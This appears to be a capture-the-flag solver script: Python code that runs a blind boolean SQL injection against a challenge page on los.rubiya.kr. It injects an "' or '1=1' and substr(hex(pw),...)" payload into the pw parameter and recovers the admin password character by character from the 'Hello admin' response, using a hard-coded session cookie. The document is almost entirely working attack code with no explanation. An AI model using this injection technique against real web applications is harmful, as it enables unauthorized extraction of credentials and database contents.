import requests
url = 'https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php'
#headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}
cookies = {'PHPSESSID': 'qm5anunn29ek2toeolnatj88mh'}
length = 24
hex_value='0123456789abcdefghijklmnopqrstuvwxyz'
pw=""

for i in range(1,length+1):
    for j in hex_value:
        query = "?pw=' or '1=1' and substr(hex(pw),{},1)='{}".format(i,j)
        r = requests.get(url+query,cookies=cookies)
        if "Hello admin" in r.text:
            pw+=j
            print("pass: ",pw)
            break
